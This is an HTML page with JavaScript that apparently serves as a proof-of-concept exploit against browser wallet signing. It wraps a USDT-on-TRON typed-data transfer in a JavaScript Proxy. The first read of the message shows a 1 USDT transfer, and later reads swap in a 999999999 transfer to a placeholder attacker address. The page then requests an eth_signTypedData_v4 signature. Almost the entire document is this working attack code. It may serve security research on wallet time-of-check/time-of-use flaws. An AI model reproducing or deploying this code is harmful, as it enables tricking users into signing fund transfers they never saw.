<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>proxy stack — usdt tron</title>
<style>
  body { margin:0; padding:12px; font:12px/1.4 ui-monospace,monospace;
         background:#0e1116; color:#c9d1d9; }
  button { background:#21262d; color:#c9d1d9; border:1px solid #f85149;
           border-radius:4px; padding:6px 14px; font:inherit; cursor:pointer; }
  pre { background:#0a0d12; border:1px solid #2b3138; border-radius:4px;
        padding:8px; margin:8px 0; white-space:pre-wrap; word-break:break-all;
        max-height:70vh; overflow:auto; }
  h2 { font-size:12px; color:#7d8590; text-transform:uppercase; margin:0 0 8px; }
</style>
</head>
<body>

<h2>usdt tron · proxy read stack</h2>
<button id="go">fire</button>
<pre id="out">ready</pre>

<script>
const OUT = document.getElementById('out');
const log = (s) => { OUT.textContent += s + '\n'; OUT.scrollTop = OUT.scrollHeight; };

// USDT TRON
const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const ATTACKER = 'TAttackerXXXXXXXXXXXXXXXXXXXXXXX';

// payload: TRON transfer через TIP-712-подобную структуру
const base = {
  domain: {
    name: 'USDT',
    version: '1',
    chainId: 728126428,              // TRON mainnet
    verifyingContract: USDT,
  },
  types: {
    Transfer: [
      { name: 'to',     type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
  },
  primaryType: 'Transfer',
  message: { to: USDT, amount: '1000000' },  // 1 USDT (6 decimals)
};

let reads = 0;
const readLog = [];

const proxy = new Proxy(base, {
  get(t, k, r) {
    if (k === 'message') {
      reads++;
      const stack = (new Error().stack || '').split('\n').slice(2, 6).join('\n');
      readLog.push({ n: reads, stack });
      log(`[read ${reads}] message · stack:\n${stack}\n`);
      if (reads >= 2) {
        log(`[read ${reads}] → returning ATTACKER payload`);
        return { to: ATTACKER, amount: '999999999' };
      }
    }
    return Reflect.get(t, k, r);
  },
});

document.getElementById('go').onclick = async () => {
  OUT.textContent = '';
  reads = 0; readLog.length = 0;
  log('env: ' + location.origin);
  log('ethereum: ' + (!!window.ethereum));
  if (!window.ethereum) { log('no bridge'); return; }

  let from;
  try {
    const acc = await window.ethereum.request({ method: 'eth_requestAccounts' });
    from = acc[0];
    log('from: ' + from);
  } catch (e) { log('accounts error: ' + e.message); return; }

  log('\n--- sending proxy payload ---');
  try {
    const sig = await window.ethereum.request({
      method: 'eth_signTypedData_v4',
      params: [from, proxy],
    });
    log('\nsig: ' + sig);
  } catch (e) {
    log('\nerror: ' + e.code + ' ' + e.message);
  }

  log('\n--- read summary ---');
  log('total reads: ' + reads);
  readLog.forEach(r => log(`read ${r.n}: ${r.stack.split('\n')[1] || '?'}`));
};
</script>
</body>
</html>
